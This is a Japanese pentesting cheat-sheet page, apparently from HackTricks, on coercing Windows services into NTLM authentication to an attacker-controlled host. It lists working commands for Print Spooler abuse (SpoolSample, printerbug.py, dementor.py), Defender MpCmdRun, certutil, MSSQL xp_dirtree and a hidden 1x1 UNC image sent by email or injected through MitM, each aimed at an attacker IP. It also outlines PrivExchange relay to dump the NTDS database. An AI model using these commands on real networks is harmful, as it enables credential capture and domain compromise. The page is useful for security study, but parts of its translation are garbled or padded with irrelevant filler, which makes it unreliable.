# NTLM特権認証を強制する

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです
* [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。

</details>

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers)は、サードパーティの依存関係を回避するために、C#とMIDLコンパイラを使用してコーディングされた**リモート認証トリガーのコレクション**です。

## スプーラーサービスの悪用

_**Print Spooler**_サービスが**有効**になっている場合、既知のAD資格情報を使用して、ドメインコントローラのプリントサーバーに新しい印刷ジョブの更新を要求し、それを**いくつかのシステムに通知するように指示**することができます。\
プリンタが任意のシステムに通知を送信する場合、そのシステムに**認証する必要があります**。したがって、攻撃者は_**Print Spooler**_サービスを任意のシステムに対して認証させることができ、この認証ではサービスはこのコンピュータアカウントを**使用**します。

### ドメイン上のWindowsサーバーの検索

PowerShellを使用して、Windowsボックスのリストを取得します。通常、サーバーが優先されるため、そこに焦点を当てましょう：
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### スプーラーサービスのリスニングを見つける

@mysmartlogin（Vincent Le Toux）の[SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket)を若干変更して使用し、スプーラーサービスがリスニングしているかどうかを確認します：
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
以下は、プリンタースプーラーサービスの乱用に関する内容です。Windowsハードニング/Active Directory方法論/printers-spooler-service-abuse.mdファイルからの内容です。

```
You can also use rpcdump.py on Linux and look for the MS-RPRN Protocol
```

Linux上でrpcdump.pyを使用し、MS-RPRNプロトコルを探すこともできます。
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
### 任意のホストに対してサービスに認証を要求する

[ここからSpoolSampleをコンパイルします](https://github.com/NotMedic/NetNTLMtoSilverTicket)。
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
または、Linuxを使用している場合は、[**3xocyteのdementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket)または[**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py)を使用します。
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
### 制約のない委任との組み合わせ

もし攻撃者がすでに[制約のない委任](unconstrained-delegation.md)を利用してコンピュータを侵害している場合、攻撃者は**プリンタをこのコンピュータに認証させることができます**。制約のない委任により、**プリンタのコンピュータアカウントのTGTが制約のない委任を持つコンピュータのメモリに保存されます**。攻撃者はすでにこのホストを侵害しているため、彼はこのチケットを**取得して悪用することができます**（[チケットの渡し](pass-the-ticket.md)）。

## RCP Force authentication

{% embed url="https://github.com/p0dalirius/Coercer" %}

## PrivExchange

`PrivExchange`攻撃は、Exchange Serverの`PushSubscription`機能の欠陥に起因します。この欠陥により、メールボックスを持つ**任意のドメインユーザがExchangeサーバを強制的に認証させる**ことができます。認証はクライアントが提供する任意のホストを介してHTTP経由で行われます。

Exchangeサービスは**SYSTEM**として実行され、デフォルトで**特権が与えられています**（つまり、2019年以前の累積更新プログラムではドメインのWriteDacl特権を持っています）。この欠陥を利用して、LDAPにリレーし、ドメインのNTDSデータベースをダンプすることができます。LDAPにリレーできない場合でも、ドメイン内の**他のホスト**にリレーして認証することができます。この攻撃により、認証されたドメインユーザアカウントを使用して直接ドメイン管理者になることができます。

****[**この技術はここからコピーされました。**](https://academy.hackthebox.com/module/143/section/1276)****

## Windows内部

Windowsマシン内にすでにアクセスしている場合、特権アカウントを使用してWindowsをサーバに接続させることができます。

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL

MSSQLは、Microsoft SQL Serverの略称です。Microsoftが開発したリレーショナルデータベース管理システム（RDBMS）です。MSSQLは、Windowsプラットフォーム上で動作し、高いパフォーマンスとセキュリティを提供します。MSSQLは、企業や組織で広く使用されており、データの保存、管理、およびアクセスを可能にします。MSSQLは、データベースの作成、テーブルの作成、データの挿入、更新、削除などの操作をサポートしています。また、トランザクションの管理やデータのバックアップと復元などの高度な機能も提供しています。MSSQLは、データのセキュリティを確保するために、アクセス制御や暗号化などのセキュリティ機能も備えています。
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
または、この別のテクニックを使用することもできます：[https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

certutil.exe（Microsoftによって署名されたバイナリ）を使用して、NTLM認証を強制することができます。
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTMLインジェクション

### メール経由

侵入したいマシンにログインするユーザーの**メールアドレス**を知っている場合、単に**1x1の画像**を含むメールを送ることができます。以下のようなHTMLコードを使用します。
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
そして彼がそれを開くと、彼は認証を試みるでしょう。

### MitM

コンピュータに対してMitM攻撃を実行し、彼が視覚化することができるページにHTMLを注入することができれば、次のような画像をページに注入してみることができます：
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## NTLMv1のクラック

[NTLMv1のチャレンジをキャプチャする方法](../ntlm/#ntlmv1-attack)を読んで、それらをクラックする方法を確認してください。\
_NTLMv1をクラックするには、Responderのチャレンジを「1122334455667788」に設定する必要があることを忘れないでください。_

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンを入手**したいですか？または、**HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)にPRを提出してください。**

</details>
